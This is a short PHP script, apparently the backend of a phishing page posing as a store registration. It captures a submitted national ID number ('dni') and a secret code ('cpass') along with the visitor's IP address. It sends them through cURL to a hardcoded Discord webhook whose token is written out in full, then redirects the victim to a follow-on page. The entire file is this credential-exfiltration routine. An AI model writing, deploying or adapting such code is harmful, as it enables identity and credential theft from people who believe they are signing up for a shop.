<?php
if (isset($_POST["dni"]) && isset($_POST["cpass"])) {
    // Limpieza de datos
    $dni = htmlspecialchars($_POST["dni"]);
    $cpass = htmlspecialchars($_POST["cpass"]);

    // Obtén la IP del cliente
    $ip_cliente = $_SERVER["REMOTE_ADDR"];

    // Tu webhook de Discord (⚠️ reemplaza por el tuyo nuevo)
    $webhook_url = "https://discordapp.com/api/webhooks/1413637036505829396/sdOGysqTEROkoDEupDgo6TecTos3RyNhRdYfxwPBi-HsK6m0iJd3YBzaVU8At0fy4Puq";

    // Mensaje que se enviará a Discord
    $mensaje = "🛒 **Nuevo registro en la tienda**\n".
               "**DNI:** $dni\n".
               "**Código:** $cpass\n".
               "**IP del cliente:** $ip_cliente";

    // Payload JSON
    $data = json_encode([
        "content" => $mensaje
    ]);

    // Enviar con cURL
    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Redirigir al usuario
    header("Location: paso.html");
    exit();
}
?>
